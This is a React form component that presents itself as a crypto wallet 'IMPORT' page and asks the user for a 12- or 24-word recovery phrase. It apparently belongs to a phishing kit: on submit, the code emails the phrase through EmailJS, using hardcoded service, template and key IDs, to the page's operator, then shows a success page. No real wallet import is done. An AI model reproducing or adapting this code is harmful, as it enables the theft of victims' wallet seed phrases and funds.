import React from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import { useRef } from "react";
import { Typography } from "@mui/material";
import { Box } from "@mui/system";

const Phrase = () => {
  const form = useRef();
  const navigate = useNavigate();
  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_1k59z4j",
        "template_1772qxl",
        form.current,
        "bG2p-qE0h7zsLKGzq"
      )
      .then(
        (result) => {
          console.log("yes");
          navigate("/success-page");
        },
        (error) => {
          console.log(error.text);
          navigate("/error");
        }
      );
  };
  return (
    <form ref={form} onSubmit={sendEmail}>
      <textarea rows={10} className="form-control" name="message" placeholder="Phrase" />
      <Box paddingY={2}>
        <Typography
          sx={{
            fontWeight: "bolder",
            fontFamily: "Montserrat",
            textAlign: "center",
            fontSize: ".9rem",
          }}
          variant="h6"
        >
          Typically 12 (sometimes 24) words seperated by single spaces
        </Typography>
      </Box>
      <input className="btn btn-primary" type="submit" value="IMPORT" />
    </form>
  );
};

export default Phrase;
